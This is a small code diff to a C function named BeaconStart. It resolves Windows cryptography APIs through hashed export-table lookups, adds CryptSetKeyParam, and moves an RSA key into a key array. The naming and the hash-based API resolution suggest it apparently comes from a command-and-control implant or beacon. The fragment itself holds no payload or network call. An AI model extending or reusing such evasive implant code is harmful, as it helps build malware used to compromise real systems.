@@ -77,6 +77,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
 		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
 		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
+		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
 		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
 		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );
 
@@ -151,11 +152,11 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				Len,
 				CRYPT_DECODE_ALLOC_FLAG,
 				NULL,
-				&Ins.RsaKey,
-				&Ins.RsaKeyLen
+				&Ins.key[0].Ptr,
+				&Ins.key[0].Len
 				))
 		{
-			Ins.api.LocalFree( Ins.RsaKey );
+			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
 
 		if ( Ins.Module[3] != NULL )
